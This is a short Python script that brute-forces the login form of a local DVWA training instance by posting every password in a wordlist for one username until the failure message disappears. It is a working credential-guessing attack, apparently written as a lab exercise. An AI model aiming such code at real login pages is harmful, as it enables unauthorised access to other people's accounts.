#!/usr/bin/python3.7
# -*- coding: utf-8 -*-

import requests, time

start = time.time()
lines = tuple(open("liste.txt", "r"))
user = "admintoto"

for line in lines:
        time.sleep(1)
        password = line.rstrip('\n')
        print("trying password : ", password)
        r = requests.post("http://127.0.0.1/dvwa/login.php", data = {"username": user, 'password' : password, 'Login': 'Login' })

        if r.content.find("Login failed".encode()) is -1:
                end = time.time()
                print("password found in", end - start, "seconds")
                exit("The password is: " + password)
